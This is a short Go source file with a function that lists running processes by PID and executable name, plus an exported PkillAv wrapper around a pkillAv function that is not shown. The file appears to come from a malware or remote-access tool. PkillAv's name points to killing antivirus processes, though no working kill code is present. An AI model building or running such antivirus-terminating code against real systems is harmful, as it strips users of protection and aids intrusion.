package os

import "github.com/mitchellh/go-ps"

func Processes() (map[int]string, error) {
	prs := make(map[int]string)
	processList, err := ps.Processes()
	if err != nil {
		return nil, err
	}

	for x := range processList {
		process := processList[x]
		prs[process.Pid()] = process.Executable()
	}

	return prs, nil
}

func PkillAv() error {
	return pkillAv()
}
